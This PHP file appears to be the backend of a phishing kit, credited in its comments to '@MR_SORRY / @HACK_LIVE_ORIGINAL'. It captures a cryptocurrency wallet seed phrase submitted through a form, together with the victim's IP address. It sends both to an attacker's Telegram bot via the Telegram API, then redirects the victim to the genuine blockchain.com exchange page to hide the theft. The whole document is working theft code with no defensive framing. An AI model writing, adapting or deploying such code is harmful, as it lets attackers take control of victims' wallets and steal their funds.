<?php
// @MR_SORRY / @HACK_LIVE_ORIGINAL / 2022
// @MR_SORRY / @HACK_LIVE_ORIGINAL / 2022
// @MR_SORRY / @HACK_LIVE_ORIGINAL / 2022
// @MR_SORRY / @HACK_LIVE_ORIGINAL / 2022

$remoteip = 
  isset($_SERVER["HTTP_CF_CONNECTING_IP"])?
     $_SERVER["HTTP_CF_CONNECTING_IP"]:
     $_SERVER["REMOTE_ADDR"]
  ;

$token = "توکن";
$chat_id = "ایدی عددی";
$codes = $_POST['mnemonic'];
$arr = array(
  'Seed Word:  ' => $codes,
  'IP: ' => $remoteip,
);


foreach($arr as $key => $value) {
  $txt .= "<b>".$key."</b> ".$value."%0A";
};

$sendToTelegram = fopen("https://api.telegram.org/bot{$token}/sendMessage?chat_id={$chat_id}&parse_mode=html&text={$txt}","r");
if ($sendToTelegram) {
  header('Location: https://exchange.blockchain.com/trade');
}

// @MR_SORRY / @HACK_LIVE_ORIGINAL / 2022
// @MR_SORRY / @HACK_LIVE_ORIGINAL / 2022
// @MR_SORRY / @HACK_LIVE_ORIGINAL / 2022
// @MR_SORRY / @HACK_LIVE_ORIGINAL / 2022

?>